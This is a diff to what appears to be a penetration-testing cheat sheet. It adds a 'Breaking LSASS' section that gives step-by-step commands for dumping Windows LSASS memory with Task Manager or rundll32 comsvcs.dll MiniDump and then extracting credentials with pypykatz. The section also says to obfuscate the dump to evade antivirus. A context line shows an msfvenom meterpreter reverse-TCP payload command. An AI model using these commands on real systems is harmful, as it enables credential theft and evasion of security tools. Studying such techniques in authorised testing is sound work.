@@ -229,3 +229,28 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
     2. source bin/activate
     3. creds search ****
 ```
+
+<br> 
+
+# Breaking LSASS
+```
+# Get a memory dump to attack LSASS. If we get it off the system we make less noise. 
+# One way to do this is to use task manager 
+    1. Task Manager 
+    2. Process Tab
+    3. Local Securit Authority Process 
+    4. Create Dump File 
+
+# Another way is to use rundll32.exe
+    1. First find the PID
+        1a. tasklist /scv
+        1b. get lsass PID
+        1c. Or use powershell Get-Process lsass
+    2. rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+    3. Note this is noisy and will be picked up by an AV. Find a way to obfuscate it 
+
+# Find users creds in the dump using pypykatz (Python version of Mimikatz)
+    1. pypykatz lsa minidump /path/lsass.dmp
+
+# Crack the dumped Hashes 
+```
